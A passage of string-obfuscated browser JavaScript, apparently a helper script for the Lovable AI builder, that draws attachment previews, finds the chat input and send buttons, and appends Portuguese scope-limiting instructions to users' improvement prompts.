const _n3999fd=(_n500f92['mim'+'e_t'+'ype']||'')['sta'+'rts'+'Wit'+'h']('ima'+'ge/');
if(_n3999fd&&_n500f92['dow'+'nlo'+'ad_'+'url']){
const _n10d52d=document['cre'+'ate'+'Ele'+'men'+'t']('img');
_n10d52d['src']=_n500f92['dow'+'nlo'+'ad_'+'url'],_n10d52d['sty'+'le']['css'+'Tex'+'t']='max'+'-wi'+'dth'+':80'+'vw!'+'imp'+'ort'+'ant'+';
ma'+'x-h'+'eig'+'ht:'+'65v'+'h!i'+'mpo'+'rta'+'nt;
'+'bor'+'der'+'-ra'+'diu'+'s:8'+'px!'+'imp'+'ort'+'ant'+';
di'+'spl'+'ay:'+'blo'+'ck!'+'imp'+'ort'+'ant'+';
',_n3f0990['app'+'end'+'Chi'+'ld'](_n10d52d);
}
else{
const _n8c9ea2=document['cre'+'ate'+'Ele'+'men'+'t']('div');
_n8c9ea2['tex'+'tCo'+'nte'+'nt']='📄',_n8c9ea2['sty'+'le']['css'+'Tex'+'t']='fon'+'t-s'+'ize'+':64'+'px!'+'imp'+'ort'+'ant'+';
te'+'xt-'+'ali'+'gn:'+'cen'+'ter'+'!im'+'por'+'tan'+'t;
',_n3f0990['app'+'end'+'Chi'+'ld'](_n8c9ea2);
}
const _n26c341=(_n500f92['fil'+'e_n'+'ame']||'')['inc'+'lud'+'es']('.')?_n500f92['fil'+'e_n'+'ame']['spl'+'it']('.')['pop']()['toU'+'ppe'+'rCa'+'se']():'?',_n181e5d=document['cre'+'ate'+'Ele'+'men'+'t']('div');
_n181e5d['tex'+'tCo'+'nte'+'nt']=_n500f92['fil'+'e_n'+'ame']||'arq'+'uiv'+'o',_n181e5d['sty'+'le']['css'+'Tex'+'t']='col'+'or:'+'#ff'+'f!i'+'mpo'+'rta'+'nt;
'+'fon'+'t-w'+'eig'+'ht:'+'700'+'!im'+'por'+'tan'+'t;
f'+'ont'+'-si'+'ze:'+'13p'+'x!i'+'mpo'+'rta'+'nt;
'+'tex'+'t-a'+'lig'+'n:c'+'ent'+'er!'+'imp'+'ort'+'ant'+';
wo'+'rd-'+'bre'+'ak:'+'bre'+'ak-'+'all'+'!im'+'por'+'tan'+'t;
',_n3f0990['app'+'end'+'Chi'+'ld'](_n181e5d);
const _n1fd2fe=document['cre'+'ate'+'Ele'+'men'+'t']('div');
_n1fd2fe['tex'+'tCo'+'nte'+'nt']='For'+'mat'+'o:\x20'+_n26c341+(_n500f92['fil'+'e_s'+'ize']?'\x20·\x20'+_n500f92['fil'+'e_s'+'ize']:''),_n1fd2fe['sty'+'le']['css'+'Tex'+'t']='col'+'or:'+'rgb'+'a(2'+'55,'+'255'+',25'+'5,.'+'55)'+'!im'+'por'+'tan'+'t;
f'+'ont'+'-si'+'ze:'+'12p'+'x!i'+'mpo'+'rta'+'nt;
'+'tex'+'t-a'+'lig'+'n:c'+'ent'+'er!'+'imp'+'ort'+'ant'+';
',_n3f0990['app'+'end'+'Chi'+'ld'](_n1fd2fe),_n532437['app'+'end'+'Chi'+'ld'](_n3f0990),_n532437['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('cli'+'ck',()=>_n532437['rem'+'ove']()),document['doc'+'ume'+'ntE'+'lem'+'ent']['app'+'end'+'Chi'+'ld'](_n532437);
}
function _n1df40c(){
if(!_ne10f78)return;
_ne10f78['inn'+'erH'+'TML']='',_n42a806['for'+'Eac'+'h']((_nd814ea,_n2eadf2)=>{
const _n356d05=document['cre'+'ate'+'Ele'+'men'+'t']('div');
_n356d05['tit'+'le']=_nd814ea['fai'+'led']?_nd814ea['fil'+'e_n'+'ame']+('\x20—\x20'+'fal'+'ha\x20'+'no\x20'+'upl'+'oad'):_nd814ea['fil'+'e_n'+'ame']||'arq'+'uiv'+'o';
const _n37209e=_nd814ea['fai'+'led']?'#dc'+'262'+'6':'rgb'+'a(2'+'55,'+'255'+',25'+'5,.'+'18)';
_n356d05['sty'+'le']['css'+'Tex'+'t']='pos'+'iti'+'on:'+'rel'+'ati'+'ve!'+'imp'+'ort'+'ant'+';
di'+'spl'+'ay:'+'fle'+'x!i'+'mpo'+'rta'+'nt;
'+'ali'+'gn-'+'ite'+'ms:'+'cen'+'ter'+'!im'+'por'+'tan'+'t;
'+('jus'+'tif'+'y-c'+'ont'+'ent'+':ce'+'nte'+'r!i'+'mpo'+'rta'+'nt;
'+'wid'+'th:'+'46p'+'x!i'+'mpo'+'rta'+'nt;
'+'hei'+'ght'+':46'+'px!'+'imp'+'ort'+'ant'+';
')+('bac'+'kgr'+'oun'+'d:r'+'gba'+'(20'+',20'+',25'+',.9'+'2)!'+'imp'+'ort'+'ant'+';
bo'+'rde'+'r:1'+'.5p'+'x\x20s'+'oli'+'d\x20')+_n37209e+('!im'+'por'+'tan'+'t;
')+('bor'+'der'+'-ra'+'diu'+'s:1'+'0px'+'!im'+'por'+'tan'+'t;
c'+'urs'+'or:'+'poi'+'nte'+'r!i'+'mpo'+'rta'+'nt;
'+'poi'+'nte'+'r-e'+'ven'+'ts:'+'aut'+'o!i'+'mpo'+'rta'+'nt;
')+('box'+'-sh'+'ado'+'w:0'+'\x202p'+'x\x206'+'px\x20'+'rgb'+'a(0'+',0,'+'0,.'+'3)!'+'imp'+'ort'+'ant'+';
ov'+'erf'+'low'+':hi'+'dde'+'n!i'+'mpo'+'rta'+'nt;
');
const _n775dda=(_nd814ea['mim'+'e_t'+'ype']||'')['sta'+'rts'+'Wit'+'h']('ima'+'ge/'),_n573f88=_nd814ea['loc'+'al_'+'pre'+'vie'+'w']||_nd814ea['dow'+'nlo'+'ad_'+'url'];
if(_n775dda&&_n573f88){
const _n51b0bd=document['cre'+'ate'+'Ele'+'men'+'t']('img');
_n51b0bd['src']=_n573f88,_n51b0bd['sty'+'le']['css'+'Tex'+'t']='wid'+'th:'+'100'+'%!i'+'mpo'+'rta'+'nt;
'+'hei'+'ght'+':10'+'0%!'+'imp'+'ort'+'ant'+';
ob'+'jec'+'t-f'+'it:'+'cov'+'er!'+'imp'+'ort'+'ant'+';
',_n356d05['app'+'end'+'Chi'+'ld'](_n51b0bd);
}
else{
const _n302adc=document['cre'+'ate'+'Ele'+'men'+'t']('spa'+'n');
_n302adc['tex'+'tCo'+'nte'+'nt']=_nd814ea['fai'+'led']?'⚠':'📄',_n302adc['sty'+'le']['css'+'Tex'+'t']='fon'+'t-s'+'ize'+':22'+'px!'+'imp'+'ort'+'ant'+';
',_n356d05['app'+'end'+'Chi'+'ld'](_n302adc);
}
if(_nd814ea['upl'+'oad'+'ing']){
const _n1e6eab=document['cre'+'ate'+'Ele'+'men'+'t']('div');
_n1e6eab['sty'+'le']['css'+'Tex'+'t']='pos'+'iti'+'on:'+'abs'+'olu'+'te!'+'imp'+'ort'+'ant'+';
in'+'set'+':0!'+'imp'+'ort'+'ant'+';
ba'+'ckg'+'rou'+'nd:'+'rgb'+'a(0'+',0,'+'0,.'+'55)'+'!im'+'por'+'tan'+'t;
'+('dis'+'pla'+'y:f'+'lex'+'!im'+'por'+'tan'+'t;
a'+'lig'+'n-i'+'tem'+'s:c'+'ent'+'er!'+'imp'+'ort'+'ant'+';
ju'+'sti'+'fy-'+'con'+'ten'+'t:c'+'ent'+'er!'+'imp'+'ort'+'ant'+';
');
const _n2d8cdd=document['cre'+'ate'+'Ele'+'men'+'t']('div');
_n2d8cdd['sty'+'le']['css'+'Tex'+'t']='wid'+'th:'+'18p'+'x!i'+'mpo'+'rta'+'nt;
'+'hei'+'ght'+':18'+'px!'+'imp'+'ort'+'ant'+';
bo'+'rde'+'r-r'+'adi'+'us:'+'50%'+'!im'+'por'+'tan'+'t;
'+('bor'+'der'+':2p'+'x\x20s'+'oli'+'d\x20r'+'gba'+'(25'+'5,2'+'55,'+'255'+',.3'+')!i'+'mpo'+'rta'+'nt;
'+'bor'+'der'+'-to'+'p-c'+'olo'+'r:#'+'fff'+'!im'+'por'+'tan'+'t;
')+('ani'+'mat'+'ion'+':__'+'ql_'+'spi'+'n\x20.'+'8s\x20'+'lin'+'ear'+'\x20in'+'fin'+'ite'+'!im'+'por'+'tan'+'t;
'),_n1e6eab['app'+'end'+'Chi'+'ld'](_n2d8cdd),_n356d05['app'+'end'+'Chi'+'ld'](_n1e6eab);
}
_n356d05['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('cli'+'ck',_n39a9cd=>{
_n39a9cd['pre'+'ven'+'tDe'+'fau'+'lt'](),_n39a9cd['sto'+'pPr'+'opa'+'gat'+'ion']();
if(_nd814ea['upl'+'oad'+'ing']){
_n1a4cc1('⏳\x20A'+'ind'+'a\x20e'+'nvi'+'and'+'o..'+'.',![]);
return;
}
if(_nd814ea['fai'+'led']){
_n1a4cc1('⚠\x20F'+'alh'+'a\x20n'+'o\x20u'+'plo'+'ad\x20'+'—\x20r'+'emo'+'va\x20'+'e\x20t'+'ent'+'e\x20d'+'e\x20n'+'ovo'+'.',![]);
return;
}
_n58a975(_nd814ea);
}
);
const _n5439b7=document['cre'+'ate'+'Ele'+'men'+'t']('spa'+'n');
_n5439b7['tex'+'tCo'+'nte'+'nt']='✕',_n5439b7['tit'+'le']='Rem'+'ove'+'r',_n5439b7['sty'+'le']['css'+'Tex'+'t']='pos'+'iti'+'on:'+'abs'+'olu'+'te!'+'imp'+'ort'+'ant'+';
to'+'p:-'+'7px'+'!im'+'por'+'tan'+'t;
r'+'igh'+'t:-'+'7px'+'!im'+'por'+'tan'+'t;
'+('wid'+'th:'+'20p'+'x!i'+'mpo'+'rta'+'nt;
'+'hei'+'ght'+':20'+'px!'+'imp'+'ort'+'ant'+';
bo'+'rde'+'r-r'+'adi'+'us:'+'50%'+'!im'+'por'+'tan'+'t;
')+('bac'+'kgr'+'oun'+'d:#'+'dc2'+'626'+'!im'+'por'+'tan'+'t;
c'+'olo'+'r:#'+'fff'+'!im'+'por'+'tan'+'t;
f'+'ont'+'-si'+'ze:'+'12p'+'x!i'+'mpo'+'rta'+'nt;
'+'fon'+'t-w'+'eig'+'ht:'+'700'+'!im'+'por'+'tan'+'t;
')+('dis'+'pla'+'y:f'+'lex'+'!im'+'por'+'tan'+'t;
a'+'lig'+'n-i'+'tem'+'s:c'+'ent'+'er!'+'imp'+'ort'+'ant'+';
ju'+'sti'+'fy-'+'con'+'ten'+'t:c'+'ent'+'er!'+'imp'+'ort'+'ant'+';
')+('cur'+'sor'+':po'+'int'+'er!'+'imp'+'ort'+'ant'+';
li'+'ne-'+'hei'+'ght'+':1!'+'imp'+'ort'+'ant'+';
bo'+'rde'+'r:2'+'px\x20'+'sol'+'id\x20'+'#18'+'181'+'b!i'+'mpo'+'rta'+'nt;
')+('box'+'-sh'+'ado'+'w:0'+'\x201p'+'x\x204'+'px\x20'+'rgb'+'a(0'+',0,'+'0,.'+'4)!'+'imp'+'ort'+'ant'+';
'),_n5439b7['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('cli'+'ck',_n4f5f22=>{
_n4f5f22['pre'+'ven'+'tDe'+'fau'+'lt'](),_n4f5f22['sto'+'pPr'+'opa'+'gat'+'ion']();
if(_nd814ea['loc'+'al_'+'pre'+'vie'+'w'])try{
URL['rev'+'oke'+'Obj'+'ect'+'URL'](_nd814ea['loc'+'al_'+'pre'+'vie'+'w']);
}
catch(_n219366){
}
_n42a806['spl'+'ice'](_n2eadf2,0x1),_n1df40c(),_n2b21e9(),_na78c3();
}
),_n356d05['app'+'end'+'Chi'+'ld'](_n5439b7),_ne10f78['app'+'end'+'Chi'+'ld'](_n356d05);
}
);
}
function _n2b21e9(){
if(!_ne10f78||!_n3779d0)return;
try{
if(_n4e30a2()||_n42a806['len'+'gth']===0x0){
_ne10f78['sty'+'le']['set'+'Pro'+'per'+'ty']('dis'+'pla'+'y','non'+'e','imp'+'ort'+'ant');
return;
}
_ne10f78['sty'+'le']['set'+'Pro'+'per'+'ty']('dis'+'pla'+'y','fle'+'x','imp'+'ort'+'ant');
const _n549050=_n5c1974(_n3779d0),_n4cbaf6=_n549050?_n549050['get'+'Bou'+'ndi'+'ngC'+'lie'+'ntR'+'ect']():_n3779d0['get'+'Bou'+'ndi'+'ngC'+'lie'+'ntR'+'ect']();
if(_n4cbaf6['wid'+'th']===0x0&&_n4cbaf6['hei'+'ght']===0x0)return;
const _n1e6c8f=_ne10f78['get'+'Bou'+'ndi'+'ngC'+'lie'+'ntR'+'ect']()['hei'+'ght']||0x1a;
_ne10f78['sty'+'le']['top']=Math['max'](0x4,_n4cbaf6['top']-_n1e6c8f-0x6)+'px',_ne10f78['sty'+'le']['lef'+'t']=_n4cbaf6['lef'+'t']+'px';
}
catch(_n240570){
}
}
function _n470f14(){
_n2b21e9(),_na78c3();
if(_n141a67)_n1fdc97();
if(_n4ee4f7||!_ne2eca8||!_n3779d0)return;
try{
const _n7cce0=_n3779d0['get'+'Bou'+'ndi'+'ngC'+'lie'+'ntR'+'ect']();
if(!_n7cce0||_n7cce0['wid'+'th']===0x0&&_n7cce0['hei'+'ght']===0x0)return;
const _n360ee3=window['inn'+'erW'+'idt'+'h']||document['doc'+'ume'+'ntE'+'lem'+'ent']['cli'+'ent'+'Wid'+'th']||0x168,_n17d673=window['inn'+'erH'+'eig'+'ht']||document['doc'+'ume'+'ntE'+'lem'+'ent']['cli'+'ent'+'Hei'+'ght']||0x280,_n292782=_n7cce0['top']-0x3c,_n4d56c0=Math['min'](_n7cce0['rig'+'ht'],_n360ee3)-0x34;
_ne2eca8['sty'+'le']['top']=Math['min'](_n17d673-0x34,Math['max'](0x8,_n292782))+'px',_ne2eca8['sty'+'le']['lef'+'t']=Math['min'](_n360ee3-0x34,Math['max'](0x8,_n4d56c0))+'px',_ne2eca8['sty'+'le']['rig'+'ht']='aut'+'o',_ne2eca8['sty'+'le']['bot'+'tom']='aut'+'o';
}
catch(_n4e17a8){
}
}
function _n5c1974(_n4d1e1c){
if(!_n4d1e1c)return null;
const _n224de8=_n4d1e1c['que'+'ryS'+'ele'+'cto'+'rAl'+'l']('tex'+'tar'+'ea,'+'\x20[c'+'ont'+'ent'+'edi'+'tab'+'le]');
for(const _n376104 of _n224de8){
const _n29e2c4=_n376104['get'+'Att'+'rib'+'ute']('pla'+'ceh'+'old'+'er')||'';
if(/ask lovable|lovable/i['tes'+'t'](_n29e2c4))return _n376104;
}
return _n224de8[0x0]||null;
}
function _n3c2649(_n328219){
if(!_n328219)return'bui'+'ld';
const _n23accd=_n328219['que'+'ryS'+'ele'+'cto'+'rAl'+'l']('but'+'ton');
for(const _n19341d of _n23accd){
const _n5e1225=(_n19341d['tex'+'tCo'+'nte'+'nt']||'')['rep'+'lac'+'e'](/\s+/g,'\x20')['tri'+'m']();
if(/^plan$/i['tes'+'t'](_n5e1225))return'pla'+'n';
if(/^build$/i['tes'+'t'](_n5e1225))return'bui'+'ld';
}
return'bui'+'ld';
}
const _n3d4cae=/send|enviar|submit/i,_n31c0b1=/mic|voice|attach|upload|anexo|gravar|record|áudio|audio/i;
function _n34a31d(_n230403){
if(!_n230403)return null;
const _n34694b=Array['fro'+'m'](_n230403['que'+'ryS'+'ele'+'cto'+'rAl'+'l']('but'+'ton'));
for(const _n50b1f1 of _n34694b){
const _n3a7040=(_n50b1f1['get'+'Att'+'rib'+'ute']('ari'+'a-l'+'abe'+'l')||'')+'\x20'+(_n50b1f1['tit'+'le']||'');
if(_n3d4cae['tes'+'t'](_n3a7040))return _n50b1f1;
}
const _n144ecc=_n230403['que'+'ryS'+'ele'+'cto'+'r']('but'+'ton'+'[ty'+'pe='+'\x22su'+'bmi'+'t\x22]');
if(_n144ecc)return _n144ecc;
let _n2c7c86=null,_n4d1040=-Infinity;
for(const _n33bfb0 of _n34694b){
const _n2373f3=(_n33bfb0['get'+'Att'+'rib'+'ute']('ari'+'a-l'+'abe'+'l')||'')+'\x20'+(_n33bfb0['tit'+'le']||'');
if(_n31c0b1['tes'+'t'](_n2373f3))continue;
const _n531930=_n33bfb0['get'+'Bou'+'ndi'+'ngC'+'lie'+'ntR'+'ect']();
if(_n531930['wid'+'th']<0x10||_n531930['hei'+'ght']<0x10||_n531930['wid'+'th']>0x3c||_n531930['hei'+'ght']>0x3c)continue;
const _n3762f0=_n531930['rig'+'ht']*0x2+_n531930['bot'+'tom'];
_n3762f0>_n4d1040&&(_n4d1040=_n3762f0,_n2c7c86=_n33bfb0);
}
return _n2c7c86;
}
const _n2923ee=/mic|voice|gravar|record|áudio|audio|speak/i,_nb1f80d=/attach|upload|anexo|arquivo|file|clip/i;
function _n42d42a(_n487e10){
if(!_n487e10)return null;
for(const _n515462 of _n487e10['que'+'ryS'+'ele'+'cto'+'rAl'+'l']('but'+'ton')){
const _n2a5c2e=(_n515462['get'+'Att'+'rib'+'ute']('ari'+'a-l'+'abe'+'l')||'')+'\x20'+(_n515462['tit'+'le']||'');
if(_n2923ee['tes'+'t'](_n2a5c2e))return _n515462;
}
return null;
}
function _n5ef7ff(_n5a8aff){
if(!_n5a8aff)return null;
for(const _n1687d0 of _n5a8aff['que'+'ryS'+'ele'+'cto'+'rAl'+'l']('but'+'ton')){
const _n12cf4b=(_n1687d0['get'+'Att'+'rib'+'ute']('ari'+'a-l'+'abe'+'l')||'')+'\x20'+(_n1687d0['tit'+'le']||'');
if(_nb1f80d['tes'+'t'](_n12cf4b))return _n1687d0;
}
return null;
}
function _na8eb25(_n5f4134,_n1a7514){
try{
if(_n5f4134['tag'+'Nam'+'e']==='TEX'+'TAR'+'EA'){
const _n41c8e3=Object['get'+'Own'+'Pro'+'per'+'tyD'+'esc'+'rip'+'tor'](window['HTM'+'LTe'+'xtA'+'rea'+'Ele'+'men'+'t']['pro'+'tot'+'ype'],'val'+'ue');
if(_n41c8e3&&_n41c8e3['set'])_n41c8e3['set']['cal'+'l'](_n5f4134,_n1a7514);
else _n5f4134['val'+'ue']=_n1a7514;
const _n19876d={
}
;
_n19876d['bub'+'ble'+'s']=!![],_n5f4134['dis'+'pat'+'chE'+'ven'+'t'](new Event('inp'+'ut',_n19876d));
const _n38a409={
}
;
_n38a409['bub'+'ble'+'s']=!![],_n5f4134['dis'+'pat'+'chE'+'ven'+'t'](new Event('cha'+'nge',_n38a409));
}
else{
_n5f4134['foc'+'us']();
const _n4581e5=window['get'+'Sel'+'ect'+'ion']();
if(_n4581e5){
const _n1deb8c=document['cre'+'ate'+'Ran'+'ge']();
_n1deb8c['sel'+'ect'+'Nod'+'eCo'+'nte'+'nts'](_n5f4134),_n4581e5['rem'+'ove'+'All'+'Ran'+'ges'](),_n4581e5['add'+'Ran'+'ge'](_n1deb8c);
}
const _n3b45a6=document['exe'+'cCo'+'mma'+'nd']('ins'+'ert'+'Tex'+'t',![],_n1a7514);
if(!_n3b45a6||(_n5f4134['tex'+'tCo'+'nte'+'nt']||'')['tri'+'m']()!==_n1a7514['tri'+'m']()){
_n5f4134['tex'+'tCo'+'nte'+'nt']=_n1a7514;
const _n2af031=window['get'+'Sel'+'ect'+'ion']();
if(_n2af031&&_n5f4134['las'+'tCh'+'ild']){
const _n1aba76=document['cre'+'ate'+'Ran'+'ge']();
_n1aba76['set'+'Sta'+'rtA'+'fte'+'r'](_n5f4134['las'+'tCh'+'ild']),_n1aba76['col'+'lap'+'se'](!![]),_n2af031['rem'+'ove'+'All'+'Ran'+'ges'](),_n2af031['add'+'Ran'+'ge'](_n1aba76);
}
const _n239f8f={
}
;
_n239f8f['bub'+'ble'+'s']=!![],_n239f8f['can'+'cel'+'abl'+'e']=!![],_n5f4134['dis'+'pat'+'chE'+'ven'+'t'](new InputEvent('inp'+'ut',_n239f8f));
const _n432377={
}
;
_n432377['bub'+'ble'+'s']=!![],_n5f4134['dis'+'pat'+'chE'+'ven'+'t'](new Event('cha'+'nge',_n432377));
}
}
}
catch(_n5dc3bd){
try{
_n5f4134['tex'+'tCo'+'nte'+'nt']=_n1a7514;
const _n28ef94={
}
;
_n28ef94['bub'+'ble'+'s']=!![],_n5f4134['dis'+'pat'+'chE'+'ven'+'t'](new Event('inp'+'ut',_n28ef94));
}
catch(_n5dca73){
}
}
}
function _n5c0d42(_n1558d5){
const _n443c97=_n1558d5['tri'+'m']();
if(!_n443c97||_n443c97['len'+'gth']<0x3)return _n443c97;
const _n4a89e6=_n443c97['toL'+'owe'+'rCa'+'se'](),_n2fad4f=(..._n49860d)=>_n49860d['som'+'e'](_n3f7bce=>_n4a89e6['inc'+'lud'+'es'](_n3f7bce)),_n308f63=_n443c97['spl'+'it'](/\s+/)['len'+'gth'],_n2ebe2c=_n2fad4f('mel'+'hor'+'e','mel'+'hor'+'a','mel'+'hor'+'ar','oti'+'miz'+'e','oti'+'miz'+'ar','cor'+'rij'+'a','cor'+'rig'+'ir','rev'+'ise','rev'+'isa'+'r','ref'+'ato'+'re','ref'+'ato'+'rar','aju'+'ste','aju'+'sta'+'r','con'+'ser'+'te','con'+'ser'+'tar','atu'+'ali'+'ze','atu'+'ali'+'zar','org'+'ani'+'ze','org'+'ani'+'zar','sim'+'pli'+'fiq'+'ue','sim'+'pli'+'fic'+'ar','lim'+'pe','lim'+'par','mel'+'hor'+'ia','rev'+'isã'+'o','rev'+'isa'+'o','aju'+'ste','oti'+'miz'+'açã'+'o','oti'+'miz'+'aca'+'o');
if(_n2ebe2c){
const _n1949b1=[];
if(_n2fad4f('ban'+'co\x20'+'de\x20'+'dad'+'o','ban'+'co\x20'+'dad'+'os','dat'+'aba'+'se','sch'+'ema','mig'+'rat'+'ion','sql','pos'+'tgr'+'es','mys'+'ql','sql'+'ite','pri'+'sma','tab'+'ela','rel'+'aci'+'ona'+'men'+'to'))_n1949b1['pus'+'h']('Ban'+'co\x20'+'de\x20'+'dad'+'os:'+'\x20An'+'ali'+'se\x20'+'tod'+'a\x20a'+'\x20es'+'tru'+'tur'+'a\x20a'+'tua'+'l\x20d'+'o\x20b'+'anc'+'o\x20d'+'e\x20d'+'ado'+'s\x20m'+'ant'+'end'+'o\x20s'+'ua\x20'+'arq'+'uit'+'etu'+'ra\x20'+'exi'+'ste'+'nte'+'.\x20I'+'den'+'tif'+'iqu'+'e\x20i'+'nco'+'nsi'+'stê'+'nci'+'as,'+'\x20re'+'dun'+'dân'+'cia'+'s,\x20'+'pro'+'ble'+'mas'+'\x20de'+'\x20re'+'lac'+'ion'+'ame'+'nto'+',\x20n'+'ome'+'ncl'+'atu'+'ra\x20'+'ina'+'deq'+'uad'+'a\x20e'+'\x20qu'+'est'+'ões'+'\x20de'+'\x20or'+'gan'+'iza'+'ção'+'.\x20N'+'ão\x20'+'adi'+'cio'+'ne\x20'+'nov'+'as\x20'+'tab'+'ela'+'s,\x20'+'cam'+'pos'+'\x20ou'+'\x20te'+'cno'+'log'+'ias'+'\x20qu'+'e\x20n'+'ão\x20'+'faç'+'am\x20'+'par'+'te\x20'+'do\x20'+'pro'+'jet'+'o.');
if(_n2fad4f('des'+'ign','des'+'ign'+'er','ui','ux','int'+'erf'+'ace','lay'+'out','vis'+'ual','est'+'ilo','apa'+'rên'+'cia','apa'+'ren'+'cia','com'+'pon'+'ent'+'e','com'+'pon'+'ent','tel'+'a'))_n1949b1['pus'+'h']('Des'+'ign'+'\x20/\x20'+'Int'+'erf'+'ace'+':\x20A'+'nal'+'ise'+'\x20a\x20'+'int'+'erf'+'ace'+'\x20ex'+'ist'+'ent'+'e\x20n'+'o\x20p'+'roj'+'eto'+'\x20e\x20'+'ide'+'nti'+'fiq'+'ue\x20'+'mel'+'hor'+'ias'+'\x20no'+'s\x20e'+'lem'+'ent'+'os\x20'+'já\x20'+'imp'+'lem'+'ent'+'ado'+'s.\x20'+'Mel'+'hor'+'e\x20a'+'\x20or'+'gan'+'iza'+'ção'+'\x20vi'+'sua'+'l,\x20'+'con'+'sis'+'tên'+'cia'+'\x20e\x20'+'cla'+'rez'+'a\x20d'+'os\x20'+'com'+'pon'+'ent'+'es\x20'+'exi'+'ste'+'nte'+'s.\x20'+'Não'+'\x20ad'+'ici'+'one'+'\x20no'+'vos'+'\x20el'+'eme'+'nto'+'s,\x20'+'ani'+'maç'+'ões'+',\x20s'+'eçõ'+'es\x20'+'ou\x20'+'fun'+'cio'+'nal'+'ida'+'des'+'\x20nã'+'o\x20s'+'oli'+'cit'+'ada'+'s.');
if(_n2fad4f('lan'+'din'+'g','pág'+'ina'+'\x20de'+'\x20ve'+'nda'+'s','sal'+'es\x20'+'pag'+'e','lan'+'din'+'g\x20p'+'age','pág'+'ina'+'\x20de'+'\x20ca'+'ptu'+'ra'))_n1949b1['pus'+'h']('Pág'+'ina'+'\x20de'+'\x20ve'+'nda'+'s:\x20'+'Ana'+'lis'+'e\x20a'+'\x20pá'+'gin'+'a\x20e'+'xis'+'ten'+'te\x20'+'e\x20o'+'tim'+'ize'+'\x20su'+'a\x20e'+'str'+'utu'+'ra\x20'+'atu'+'al.'+'\x20Me'+'lho'+'re\x20'+'a\x20c'+'lar'+'eza'+'\x20do'+'s\x20t'+'ext'+'os\x20'+'já\x20'+'pre'+'sen'+'tes'+'\x20e\x20'+'a\x20h'+'ier'+'arq'+'uia'+'\x20da'+'s\x20i'+'nfo'+'rma'+'çõe'+'s.\x20'+'Não'+'\x20cr'+'ie\x20'+'nov'+'as\x20'+'seç'+'ões'+',\x20b'+'otõ'+'es\x20'+'ou\x20'+'fun'+'cio'+'nal'+'ida'+'des'+'\x20qu'+'e\x20n'+'ão\x20'+'ten'+'ham'+'\x20si'+'do\x20'+'exp'+'lic'+'ita'+'men'+'te\x20'+'sol'+'ici'+'tad'+'as.');
if(_n2fad4f('cód'+'igo','cod'+'e','fun'+'ção','fun'+'cti'+'on','arq'+'uiv'+'o','fil'+'e','cla'+'sse','cla'+'ss','lóg'+'ica','log'+'ica','alg'+'ori'+'tmo'))_n1949b1['pus'+'h']('Cód'+'igo'+':\x20A'+'nal'+'ise'+'\x20o\x20'+'cód'+'igo'+'\x20ex'+'ist'+'ent'+'e\x20e'+'\x20id'+'ent'+'ifi'+'que'+'\x20me'+'lho'+'ria'+'s\x20d'+'e\x20q'+'ual'+'ida'+'de\x20'+'den'+'tro'+'\x20do'+'\x20es'+'cop'+'o\x20a'+'tua'+'l.\x20'+'Foq'+'ue\x20'+'em\x20'+'cla'+'rez'+'a,\x20'+'org'+'ani'+'zaç'+'ão\x20'+'e\x20e'+'lim'+'ina'+'ção'+'\x20de'+'\x20du'+'pli'+'caç'+'ões'+'.\x20P'+'res'+'erv'+'e\x20t'+'ota'+'lme'+'nte'+'\x20a\x20'+'lóg'+'ica'+'\x20de'+'\x20ne'+'góc'+'io\x20'+'e\x20o'+'\x20co'+'mpo'+'rta'+'men'+'to\x20'+'atu'+'al.');
if(_n2fad4f('per'+'for'+'man'+'ce','per'+'for'+'man','len'+'to','vel'+'oc','cac'+'he','car'+'reg'+'ame'+'nto'))_n1949b1['pus'+'h']('Per'+'for'+'man'+'ce:'+'\x20An'+'ali'+'se\x20'+'e\x20i'+'den'+'tif'+'iqu'+'e\x20o'+'s\x20p'+'rin'+'cip'+'ais'+'\x20ga'+'rga'+'los'+'\x20no'+'s\x20p'+'ont'+'os\x20'+'já\x20'+'imp'+'lem'+'ent'+'ado'+'s.\x20'+'Pro'+'pon'+'ha\x20'+'oti'+'miz'+'açõ'+'es\x20'+'den'+'tro'+'\x20do'+'\x20es'+'cop'+'o\x20a'+'tua'+'l\x20s'+'em\x20'+'adi'+'cio'+'nar'+'\x20no'+'vas'+'\x20bi'+'bli'+'ote'+'cas'+'\x20ou'+'\x20se'+'rvi'+'ços'+'\x20ex'+'ter'+'nos'+'.');
if(_n2fad4f('api','end'+'poi'+'nt','rot'+'a','rou'+'te','bac'+'ken'+'d','ser'+'vid'+'or'))_n1949b1['pus'+'h']('API'+'\x20/\x20'+'Bac'+'ken'+'d:\x20'+'Ana'+'lis'+'e\x20o'+'s\x20e'+'ndp'+'oin'+'ts\x20'+'e\x20r'+'ota'+'s\x20e'+'xis'+'ten'+'tes'+'\x20e\x20'+'ide'+'nti'+'fiq'+'ue\x20'+'mel'+'hor'+'ias'+'\x20de'+'ntr'+'o\x20d'+'a\x20i'+'mpl'+'eme'+'nta'+'ção'+'\x20at'+'ual'+'.\x20N'+'ão\x20'+'adi'+'cio'+'ne\x20'+'nov'+'os\x20'+'end'+'poi'+'nts'+'\x20ou'+'\x20pa'+'râm'+'etr'+'os\x20'+'alé'+'m\x20d'+'os\x20'+'já\x20'+'pre'+'sen'+'tes'+'.');
if(_n2fad4f('aut'+'ent'+'ica'+'ção','aut'+'ent'+'ica'+'cao','aut'+'h','log'+'in','sen'+'ha','jwt','tok'+'en','per'+'mis'+'são'))_n1949b1['pus'+'h']('Aut'+'ent'+'ica'+'ção'+':\x20A'+'nal'+'ise'+'\x20o\x20'+'sis'+'tem'+'a\x20d'+'e\x20a'+'ute'+'nti'+'caç'+'ão\x20'+'exi'+'ste'+'nte'+'\x20e\x20'+'ide'+'nti'+'fiq'+'ue\x20'+'pon'+'tos'+'\x20de'+'\x20me'+'lho'+'ria'+'.\x20N'+'ão\x20'+'adi'+'cio'+'ne\x20'+'nov'+'os\x20'+'mét'+'odo'+'s\x20d'+'e\x20a'+'ute'+'nti'+'caç'+'ão\x20'+'ou\x20'+'pro'+'ved'+'ore'+'s.\x20'+'Pre'+'ser'+'ve\x20'+'o\x20f'+'lux'+'o\x20j'+'á\x20i'+'mpl'+'eme'+'nta'+'do.');
